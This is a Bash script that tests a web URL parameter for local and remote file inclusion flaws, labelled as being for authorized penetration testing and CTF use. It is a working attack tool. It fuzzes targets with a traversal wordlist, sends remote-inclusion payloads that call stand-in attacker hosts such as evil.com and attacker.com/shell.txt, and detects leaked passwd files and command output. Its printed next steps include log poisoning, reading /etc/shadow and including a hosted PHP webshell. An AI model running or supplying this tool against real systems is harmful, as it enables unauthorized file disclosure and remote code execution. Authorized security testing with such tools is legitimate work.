#!/usr/bin/env bash
# lfi_rfi_tester.sh — Test a URL parameter for LFI and RFI vulnerabilities
#
# !! FOR AUTHORIZED PENETRATION TESTING AND CTF USE ONLY !!
# Do not use against systems you do not own or have explicit written permission to test.
#
# USAGE:
#   ./lfi_rfi_tester.sh -u "http://target.com/page.php?file=FUZZ"
#   ./lfi_rfi_tester.sh -u "http://target.com/page.php?file=FUZZ" -t lfi
#   ./lfi_rfi_tester.sh -u "http://target.com/page.php?file=FUZZ" -t rfi -r http://attacker.com/shell.txt
#   ./lfi_rfi_tester.sh -u "http://target.com/page.php" -p file -t both
#
# LFI WORDLIST — LFI-Jhaddix.txt from danielmiessler/SecLists, resolved in order:
#   1. -w <path>   explicit path you provide
#   2. Common SecLists install paths (Kali, Homebrew, manual clone)
#   3. Cached copy in /tmp from a prior run
#   4. Downloaded at runtime from GitHub raw content
#
# REQUIREMENTS: curl, grep, sed

set -euo pipefail

# ── Colours ───────────────────────────────────────────────────────────────────
RED='\033[0;31m'; YELLOW='\033[1;33m'; GREEN='\033[0;32m'
CYAN='\033[0;36m'; BOLD='\033[1m'; DIM='\033[2m'; RESET='\033[0m'

die()    { echo -e "${RED}[!] $*${RESET}" >&2; exit 1; }
info()   { echo -e "${CYAN}[*] $*${RESET}"; }
good()   { echo -e "${GREEN}[+] $*${RESET}"; }
vuln()   { echo -e "${RED}${BOLD}[VULN] $*${RESET}"; }
warn()   { echo -e "${YELLOW}[-] $*${RESET}"; }
detail() { echo -e "${DIM}    $*${RESET}"; }
sep()    { echo -e "${BOLD}$(printf '─%.0s' {1..65})${RESET}"; }

usage() {
    cat <<EOF
${BOLD}lfi_rfi_tester.sh${RESET} — LFI / RFI vulnerability tester

  ${CYAN}-u <url>${RESET}     Target URL with FUZZ placeholder.
                 e.g. "http://target/page.php?file=FUZZ"
  ${CYAN}-p <param>${RESET}   Parameter name to inject (alternative to FUZZ in URL)
  ${CYAN}-t <type>${RESET}    Test type: lfi | rfi | both  (default: both)
  ${CYAN}-w <path>${RESET}    LFI wordlist path (default: auto-resolve LFI-Jhaddix.txt)
  ${CYAN}-r <url>${RESET}     Remote URL for RFI payloads (default: http://evil.com/test.txt)
  ${CYAN}-c <cookie>${RESET}  Cookie string, e.g. "PHPSESSID=abc123"
  ${CYAN}-H <header>${RESET}  Extra header, e.g. "Authorization: Bearer token"
  ${CYAN}-o <file>${RESET}    Save results to file
  ${CYAN}-d <delay>${RESET}   Delay between requests in seconds (default: 0)
  ${CYAN}-x${RESET}           Stop after first confirmed vulnerability
  ${CYAN}-v${RESET}           Verbose: show all tested payloads
  ${CYAN}-h${RESET}           This help

${BOLD}Wordlist resolution order (LFI):${RESET}
  1. -w <path> if supplied
  2. SecLists install: /usr/share/seclists, /opt/SecLists, ~/SecLists, Homebrew
  3. Cached /tmp/LFI-Jhaddix.txt from a previous run
  4. Downloaded at runtime from raw.githubusercontent.com

${BOLD}Examples:${RESET}
  $0 -u "http://10.10.10.5/index.php?page=FUZZ"
  $0 -u "http://10.10.10.5/index.php" -p page -t lfi -o results.txt
  $0 -u "http://10.10.10.5/view.php?f=FUZZ" -c "session=xyz" -x
  $0 -u "http://10.10.10.5/view.php?f=FUZZ" -w ~/wordlists/LFI-Jhaddix.txt
EOF
    exit 0
}

# ── Wordlist resolution ───────────────────────────────────────────────────────
JHADDIX_URL="https://raw.githubusercontent.com/danielmiessler/SecLists/master/Fuzzing/LFI/LFI-Jhaddix.txt"
JHADDIX_CACHE="/tmp/LFI-Jhaddix.txt"

SECLISTS_CANDIDATES=(
    "/usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt"
    "/usr/share/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt"
    "/opt/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt"
    "$HOME/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt"
    "$HOME/tools/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt"
    "/usr/local/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt"
    "/opt/homebrew/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt"
)

resolve_wordlist() {
    local user_path="$1"

    # 1. Explicit path from -w
    if [[ -n "$user_path" ]]; then
        [[ -f "$user_path" ]] || die "Wordlist not found: $user_path"
        echo "$user_path"
        return
    fi

    # 2. Common SecLists install locations
    for candidate in "${SECLISTS_CANDIDATES[@]}"; do
        if [[ -f "$candidate" ]]; then
            good "Found SecLists at: $candidate"
            echo "$candidate"
            return
        fi
    done

    # 3. Cached copy from a previous run
    if [[ -f "$JHADDIX_CACHE" ]]; then
        good "Using cached wordlist: $JHADDIX_CACHE"
        echo "$JHADDIX_CACHE"
        return
    fi

    # 4. Download from GitHub
    warn "SecLists not found locally — downloading LFI-Jhaddix.txt from GitHub..."
    if curl -fsSL --max-time 30 -o "$JHADDIX_CACHE" "$JHADDIX_URL" 2>/dev/null; then
        local count
        count=$(grep -c . "$JHADDIX_CACHE" 2>/dev/null || echo "?")
        good "Downloaded $count lines → cached at $JHADDIX_CACHE"
        echo "$JHADDIX_CACHE"
        return
    fi

    die "Could not download wordlist. Install SecLists or use -w <path>."
}

# Strip comments and blank lines
lfi_payloads() {
    local wordlist="$1"
    grep -v '^\s*#' "$wordlist" | grep -v '^\s*$'
}

# ── RFI payloads ──────────────────────────────────────────────────────────────
rfi_payloads() {
    local remote="$1"
    cat <<PAYLOADS
${remote}
${remote}%00
${remote}?
${remote}#
${remote}%23
//${remote#http*://}
\\\\${remote#http*://}
${remote/http:/https:}
http:${remote#*:}
${remote}%3F
PAYLOADS
}

# ── Detection: LFI ───────────────────────────────────────────────────────────
detect_lfi() {
    local body="$1"

    if echo "$body" | grep -qE 'root:[x*!]:0:0'; then
        echo "root passwd entry found"
        return 0
    fi
    if echo "$body" | grep -qiE '\[fonts\]|\[extensions\]|\[boot loader\]|127\.0\.0\.1\s+localhost'; then
        echo "Windows config/hosts file content found"
        return 0
    fi
    if echo "$body" | grep -qE '^[A-Za-z0-9+/]{40,}={0,2}$'; then
        echo "Possible base64-encoded PHP source (php://filter hit)"
        return 0
    fi
    if echo "$body" | grep -qE 'PATH=|HTTP_USER_AGENT=|DOCUMENT_ROOT='; then
        echo "Environment variables leaked (/proc/self/environ)"
        return 0
    fi
    if echo "$body" | grep -qiE 'ubuntu|debian|centos|fedora|alpine linux'; then
        echo "OS release string found"
        return 0
    fi
    if echo "$body" | grep -qE '"GET |"POST |HTTP/1\.[01]'; then
        echo "Web server log content found (log poisoning possible)"
        return 0
    fi

    return 1
}

# ── Detection: RFI ───────────────────────────────────────────────────────────
detect_rfi() {
    local body="$1" probe="$2"

    if echo "$body" | grep -qF "$probe"; then
        echo "Remote file content reflected in response"
        return 0
    fi
    if echo "$body" | grep -qiE 'uid=[0-9]+|www-data|nobody'; then
        echo "Possible remote code execution output"
        return 0
    fi

    return 1
}

# ── HTTP request ──────────────────────────────────────────────────────────────
send_request() {
    local url="$1" cookie="$2" extra_header="$3"
    local args=(-s -L --max-time 10 --max-redirs 3 -A "Mozilla/5.0")

    [[ -n "$cookie" ]]       && args+=(-b "$cookie")
    [[ -n "$extra_header" ]] && args+=(-H "$extra_header")

    curl "${args[@]}" "$url" 2>/dev/null || true
}

# ── URL builder ───────────────────────────────────────────────────────────────
build_url() {
    local base="$1" param="$2" payload="$3"

    if echo "$base" | grep -q 'FUZZ'; then
        echo "${base/FUZZ/$payload}"
    elif [[ -n "$param" ]]; then
        if echo "$base" | grep -qE "[?&]${param}="; then
            echo "$base" | sed "s/\(${param}=\)[^&]*/\1${payload}/"
        elif echo "$base" | grep -q '?'; then
            echo "${base}&${param}=${payload}"
        else
            echo "${base}?${param}=${payload}"
        fi
    else
        die "No FUZZ placeholder in URL and no -p parameter specified."
    fi
}

# ── Main ──────────────────────────────────────────────────────────────────────
main() {
    local url="" param="" test_type="both" wordlist_path=""
    local remote_url="http://evil.com/rfi_test.txt"
    local cookie="" extra_header="" outfile=""
    local delay=0 stop_first=0 verbose=0

    [[ $# -eq 0 ]] && usage

    while getopts "u:p:t:w:r:c:H:o:d:xvh" opt; do
        case "$opt" in
            u) url="$OPTARG" ;;
            p) param="$OPTARG" ;;
            t) test_type="$OPTARG" ;;
            w) wordlist_path="$OPTARG" ;;
            r) remote_url="$OPTARG" ;;
            c) cookie="$OPTARG" ;;
            H) extra_header="$OPTARG" ;;
            o) outfile="$OPTARG" ;;
            d) delay="$OPTARG" ;;
            x) stop_first=1 ;;
            v) verbose=1 ;;
            h) usage ;;
            *) usage ;;
        esac
    done

    command -v curl &>/dev/null || die "curl is required"
    [[ -z "$url" ]] && die "Target URL is required (-u)"
    [[ "$test_type" =~ ^(lfi|rfi|both)$ ]] || die "Invalid type: $test_type (lfi|rfi|both)"

    # ── Resolve LFI wordlist ──────────────────────────────────────────────────
    local resolved_wordlist=""
    if [[ "$test_type" == "lfi" || "$test_type" == "both" ]]; then
        resolved_wordlist=$(resolve_wordlist "$wordlist_path")
        local payload_count
        payload_count=$(lfi_payloads "$resolved_wordlist" | grep -c . || echo "?")
        info "Wordlist : $resolved_wordlist"
        info "Payloads : $payload_count"
    fi

    # ── Baseline ──────────────────────────────────────────────────────────────
    info "Getting baseline response..."
    local baseline_url
    baseline_url=$(build_url "$url" "$param" "BASELINE_NONEXISTENT_12345")
    local baseline
    baseline=$(send_request "$baseline_url" "$cookie" "$extra_header")
    local baseline_len=${#baseline}
    info "Baseline : $baseline_len bytes"

    if [[ -n "$outfile" ]]; then
        echo "lfi_rfi_tester results — $(date)" > "$outfile"
        echo "Target: $url" >> "$outfile"
        echo "Wordlist: ${resolved_wordlist:-n/a}" >> "$outfile"
        echo "---" >> "$outfile"
    fi

    local vuln_count=0 tested=0

    # ── LFI Testing ───────────────────────────────────────────────────────────
    if [[ "$test_type" == "lfi" || "$test_type" == "both" ]]; then
        sep
        info "Starting LFI tests (LFI-Jhaddix.txt)..."
        sep

        while IFS= read -r payload; do
            [[ -z "$payload" || "$payload" == \#* ]] && continue

            local target_url
            target_url=$(build_url "$url" "$param" "$payload")
            local response
            response=$(send_request "$target_url" "$cookie" "$extra_header")
            local resp_len=${#response}
            ((tested++))

            local match=""
            if match=$(detect_lfi "$response"); then
                vuln "[LFI CONFIRMED] $payload"
                detail "URL:    $target_url"
                detail "Reason: $match"
                detail "Length: $resp_len bytes"
                echo
                [[ -n "$outfile" ]] && echo "[LFI] $target_url | $match" >> "$outfile"
                ((vuln_count++))
                [[ "$stop_first" -eq 1 ]] && { good "Stopping on first hit (-x)."; break; }
            else
                local diff=$(( resp_len - baseline_len ))
                if [[ ${diff#-} -gt 200 ]]; then
                    warn "Anomalous response: $payload  (delta: ${diff} bytes)"
                    [[ "$verbose" -eq 1 ]] && detail "URL: $target_url"
                else
                    [[ "$verbose" -eq 1 ]] && detail "No hit: $payload"
                fi
            fi

            [[ "$delay" != "0" ]] && sleep "$delay"
        done < <(lfi_payloads "$resolved_wordlist")
    fi

    # ── RFI Testing ───────────────────────────────────────────────────────────
    if [[ "$test_type" == "rfi" || "$test_type" == "both" ]]; then
        sep
        info "Starting RFI tests (remote: $remote_url)..."
        sep

        local probe="RFI_PROBE_$(date +%s)"
        warn "RFI requires allow_url_include=On in PHP.  Probe token: $probe"
        echo

        while IFS= read -r payload; do
            [[ -z "$payload" || "$payload" == \#* ]] && continue

            local target_url
            target_url=$(build_url "$url" "$param" "$payload")
            local response
            response=$(send_request "$target_url" "$cookie" "$extra_header")
            ((tested++))

            local match=""
            if match=$(detect_rfi "$response" "$probe"); then
                vuln "[RFI CONFIRMED] $payload"
                detail "URL:    $target_url"
                detail "Reason: $match"
                echo
                [[ -n "$outfile" ]] && echo "[RFI] $target_url | $match" >> "$outfile"
                ((vuln_count++))
                [[ "$stop_first" -eq 1 ]] && { good "Stopping on first hit (-x)."; break; }
            else
                [[ "$verbose" -eq 1 ]] && detail "No hit: $payload"
            fi

            [[ "$delay" != "0" ]] && sleep "$delay"
        done < <(rfi_payloads "$remote_url")
    fi

    # ── Summary ───────────────────────────────────────────────────────────────
    sep
    echo -e "${BOLD}Results: $vuln_count confirmed from $tested requests.${RESET}"
    [[ -n "$outfile" ]] && good "Output saved to: $outfile"

    if [[ "$vuln_count" -gt 0 ]]; then
        echo
        warn "LFI next steps:"
        warn "  • php://filter to read source of other PHP files"
        warn "  • Log poisoning: inject PHP via User-Agent, then include log"
        warn "  • /proc/self/environ if User-Agent reaches environment"
        warn "  • Check readability of /etc/shadow"
        warn "RFI next steps:"
        warn "  • Host a PHP webshell and include via vulnerable param"
        warn "  • Requires allow_url_include=On and allow_url_fopen=On"
    fi
}

main "$@"
